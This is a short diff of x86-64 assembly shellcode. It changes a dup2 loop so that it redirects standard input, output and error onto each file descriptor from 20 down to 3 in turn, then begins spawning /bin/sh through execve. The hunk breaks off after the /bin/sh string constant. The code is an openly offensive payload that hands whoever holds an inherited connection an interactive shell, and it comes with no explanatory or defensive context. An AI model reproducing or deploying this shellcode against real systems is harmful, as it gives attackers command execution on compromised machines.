@@ -8,17 +8,21 @@ global main
 main:	
 	xor rax,rax
 	xor rdi,rdi
+	mov dil,20		;dup2 everything to fd me (I hope)
+reset:
 	xor rsi,rsi
-	mov sil,2		;counter
-	mov dil,3		;dup2 everything to fd 3(me I hope)
+	mov sil,2		;counter	
 copy:
 	xor rax,rax
 	mov al,33
 	syscall
 	dec rsi
 	jns copy
-	;; now just some local shellcode
 	
+	;; now just some local shellcode
+	dec rdi
+	cmp dil,2
+	jnz reset
 	xor rax,rax
 	push rax
 	mov rdi, 0x68732f2f6e69622f ;/bin/sh
